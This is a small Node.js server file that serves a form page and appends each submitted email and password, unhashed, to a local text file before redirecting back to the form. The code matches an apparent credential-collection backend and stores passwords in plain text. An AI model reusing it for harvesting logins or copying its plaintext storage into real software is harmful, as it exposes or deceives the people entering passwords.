const http = require('http');
const fs = require('fs');
const querystring = require('querystring');
const path = require('path');

const server = http.createServer((req, res) => {

  // Serve HTML page
  if (req.method === 'GET' && req.url === '/') {
    fs.readFile(path.join(__dirname, 'index.html'), (err, data) => {
      if (err) {
        res.writeHead(500, { 'Content-Type': 'text/plain' });
        return res.end('Error loading page');
      }
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(data);
    });

  // Handle form submission
  } else if (req.method === 'POST' && req.url === '/submit') {
    let body = '';

    req.on('data', chunk => body += chunk.toString());

    req.on('end', () => {
      const formData = querystring.parse(body);

      fs.appendFile(
        path.join(__dirname, 'data.txt'),
        `Email: ${formData.email}, Password: ${formData.password}\n`,
        (err) => {
          if (err) {
            res.writeHead(500, { 'Content-Type': 'text/plain' });
            return res.end('Error saving file');
          }

          // Redirect back to form after submission
          res.writeHead(302, { 'Location': '/' });
          res.end();
        }
      );
    });

  // Serve CSS file
  } else if (req.method === 'GET' && req.url === '/w3.css') {
    fs.readFile(path.join(__dirname, 'w3.css'), (err, data) => {
      if (err) {
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        return res.end('CSS file not found');
      }
      res.writeHead(200, { 'Content-Type': 'text/css' });
      res.end(data);
    });

  // Any other route → 404
  } else {
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('Not Found');
  }

});

// Start server
server.listen(3000, () => {
  console.log('Server listening on http://localhost:3000');
});
